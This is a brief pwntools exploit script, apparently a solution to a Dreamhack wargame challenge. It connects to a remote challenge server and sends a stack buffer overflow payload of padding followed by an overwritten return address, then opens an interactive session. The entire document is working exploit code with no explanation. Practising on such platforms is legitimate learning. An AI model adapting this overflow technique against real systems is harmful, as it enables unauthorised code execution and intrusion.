from pwn import *

url='host3.dreamhack.games'
port=14355

p= remote(url,port)
address=p64(0x4006aa)

payload= b'A'*0x30
payload+=b'A'*0x8
payload+=address

p.sendlineafter("Input: ",payload)


p.interactive()
